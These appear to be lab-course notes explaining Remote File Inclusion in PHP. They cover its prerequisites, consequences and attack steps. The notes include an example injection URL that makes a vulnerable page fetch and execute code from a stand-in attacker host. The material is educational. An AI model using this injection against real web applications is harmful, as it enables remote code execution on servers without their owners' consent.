## Introduction
- Remote File Inclusion (RFI) is a technique to include remote files and into a vulnerable application.
- Like LFI, the RFI occurs when improperly sanitizing user input, allowing an attacker to inject an external URL into include function.
- One requirement for RFI is that the allow_url_fopen option needs to be on.

## consequences of a successful RFI attack include:
- Sensitive Information Disclosure
- Cross-site Scripting (XSS)
- Denial of Service (DoS)
The risk of RFI is higher than LFI since RFI vulnerabilities allow an attacker to gain Remote Command Execution (RCE) on the server.

## Broad overview of RFI:
An external server must communicate with the application server for a successful RFI attack where the attacker hosts malicious files on their server. Then the malicious file is injected into the include function via HTTP requests, and the content of the malicious file executes on the vulnerable application server.

### RFI steps
First, the attacker injects the malicious URL, which points to the attacker's server, such asÂ http://webapp.thm/index.php?lang=http://attacker.thm/cmd.txt.
If there is no input validation, then the malicious URL passes into the include function. Next, the web app server will send a GET request to the malicious server to fetch the file. As a result, the web app includes the remote file into include function to execute the PHP file within the page and send the execution content to the attacker. In our case, the current page somewhere has to show the Hello THM message.
